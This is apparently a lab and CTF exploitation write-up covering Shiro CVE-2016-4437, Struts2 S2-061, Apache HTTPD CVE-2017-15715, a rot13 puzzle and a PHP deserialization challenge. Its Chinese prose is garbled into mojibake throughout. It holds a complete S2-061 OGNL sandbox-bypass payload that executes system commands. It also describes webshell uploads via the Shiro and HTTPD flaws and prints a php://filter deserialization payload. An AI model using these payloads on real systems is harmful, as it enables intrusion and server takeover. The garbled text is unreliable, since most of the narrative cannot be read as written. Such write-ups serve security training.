## Shiro ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2016-4437ï¼‰

<img src="./images/image-20240423193256266.png" alt="image-20240423193256266" style="zoom:33%;" />

æŠ“åŒ…åçœ‹åˆ°å¾ˆæ˜æ˜¾çš„shiro550çš„ç‰¹å¾

![image-20240423193237559](./images/image-20240423193237559.png)

è¿™é‡Œæœ‰ä¸ªå·¥å…·shiro_attackå¯ä»¥åˆ©ç”¨å®ƒæ¥è¿›è¡Œä¸€äº›æ“ä½œ<img src="./images/image-20240423194132673.png" alt="image-20240423194132673" style="zoom:50%;" />

æ£€æµ‹åˆ°åå¯ä»¥è¿›è¡Œä¼ ğŸ![image-20240423194752758](./images/image-20240423194752758.png)

<img src="./images/image-20240423194821660.png" alt="image-20240423194821660" style="zoom:50%;" />

è¿™é‡Œæ˜¾ç¤ºè¿æ¥æˆåŠŸ

## Struts2 S2-061 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ ï¼ˆCVE-2020-17530ï¼‰

ä½¿ç”¨æŸäº›tagç­‰æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨OGNLè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œä»è€Œé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œ,å¯èƒ½ç…§æˆæ§åˆ¶æœåŠ¡å™¨ç­‰å±å®³ã€‚S2-061æ˜¯å¯¹S2-059æ²™ç›’è¿›è¡Œçš„ç»•è¿‡
**å½±å“èŒƒå›´**ï¼šApache Struts 2.0.0-2.5.25

<img src="./images/image-20240427152725880.png" alt="image-20240427152725880" style="zoom: 67%;" />

æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨ payload:?id=%25%7b+%27test%27+%2b+(11+%2b+11).toString()%7d



<img src="./images/image-20240427155510112.png" alt="image-20240427155510112" style="zoom: 50%;" />

ç”¨st2å·¥å…·åˆ©ç”¨<img src="./images/image-20240427165352987.png" alt="image-20240427165352987" style="zoom: 50%;" />

æˆ–è€…å¯ä»¥é€šè¿‡bpåˆ©ç”¨ï¼Œå…ˆæŠŠæäº¤æ–¹å¼æ”¹ä¸ºPost

```
------WebKitFormBoundaryl7d1B1aGsV2wcZwF Content-Disposition: form-data; name="id" %{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("id")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))} ------WebKitFormBoundaryl7d1B1aGsV2wcZwF--
```

![image-20240427170544983](./images/image-20240427170544983.png)

## Apache HTTPD æ¢è¡Œè§£ææ¼æ´ï¼ˆCVE-2017-15715ï¼‰

**HTTPD**çš„ç‰ˆæœ¬**2.4.0~2.4.29**éƒ½æœ‰å¯èƒ½å­˜åœ¨è¯¥æ¼æ´ï¼Œåœ¨è§£æPHPæ—¶ï¼Œ**xx.php\x0A**å°†è¢«æŒ‰ç…§PHPåç¼€è¿›è¡Œè§£æï¼Œå¯¼è‡´å¯ä»¥ç»•è¿‡ä¸€äº›æœåŠ¡å™¨çš„å®‰å…¨ç­–ç•¥ã€‚

<img src="./images/image-20240427172935055.png" alt="image-20240427172935055" style="zoom: 50%;" />

ä¸Šä¼ ä¸€ä¸ªğŸè¿›è¡ŒæŠ“åŒ…<img src="./images/image-20240427173011271.png" alt="image-20240427173011271" style="zoom: 50%;" />

åœ¨æ–‡ä»¶åååŠ å…¥åŠ å…¥0a

![image-20240427175102162](./images/image-20240427175102162.png)

æäº¤åè®¿é—®åˆšæ‰ä¸Šä¼ çš„æ–‡ä»¶

![image-20240427174928606](./images/image-20240427174928606.png)

æ‹¿èšå‰‘è¿›è¡Œè¿æ¥ï¼ŒæˆåŠŸæ‹¿ä¸‹

<img src="./images/image-20240427175247749.png" alt="image-20240427175247749" style="zoom:50%;" />

## å›è½¬åä¸‰ä½

![image-20240428134700073](./images/image-20240428134700073.png)

å¾—åˆ°base64çš„åŠ å¯†ï¼Œè§£å¯†åå‘ç°ä¸å¤ªå¯¹<img src="./images/image-20240428134739524.png" alt="image-20240428134739524" style="zoom: 67%;" />

é¢˜ç›®è¯´æ˜¯åä¸‰ä½ï¼Œåº”è¯¥æ˜¯rot13è§£å¯†ï¼ˆ[å‡¯æ’’åŠ å¯†](https://baike.baidu.com/item/å‡¯æ’’åŠ å¯†/0?fromModule=lemma_inlink)çš„ä¸€ç§å˜ä½“ï¼‰![image-20240428135829683](./images/image-20240428135829683.png)

å¾—åˆ°base64ååœ¨è¿›è¡Œè§£å¯†<img src="./images/image-20240428140029443.png" alt="image-20240428140029443" style="zoom:50%;" />

## [ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz

```
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```

é€šè¿‡ä»£ç ä¸€çœ¼çœ‹åˆ°äº†å«flagçš„æ–‡ä»¶åï¼Œå¾€ä¸‹çœ‹å‘ç°äº†readä¸­æœ‰è¯»å–æ–‡ä»¶çš„å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´è¦è°ƒç”¨readæ¥è¯»å–flagï¼Œè€Œè¦è°ƒç”¨readå¾€ä¸Šçœ‹ï¼Œå‘ç°processæœ‰ä¸ªopå˜é‡å¯ä»¥è§¦å‘readï¼Œå½“op=1æ—¶è§¦å‘writeï¼Œå½“op=2æ—¶åˆ™è§¦å‘readï¼Œäºæ˜¯å¼€å§‹æ„é€ 

```
<?php
class FileHandler{
	public $op = 2;
	public $filename = "php://filter/read=convert.base64-encode/resource=flag.php";ï¼ˆå› ä¸ºæ˜¯phpæ–‡ä»¶æ‰€æœ‰ç”¨ä¼ªåè®®å»è¯»ï¼‰
	public $content;
}
$obj = new FileHandler();
echo serialize($obj);
?>
```

![image-20240428144613235](./images/image-20240428144613235.png)

ä¸Šé¢æç¤ºæ˜¯é€šè¿‡strè¿›è¡Œä¼ å‚äºæ˜¯æ„é€ payloadï¼š

```
/?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}
```

![image-20240428144847451](./images/image-20240428144847451.png)

è§£ç åå¾—åˆ°flag<img src="./images/image-20240428144925390.png" alt="image-20240428144925390" style="zoom: 80%;" />

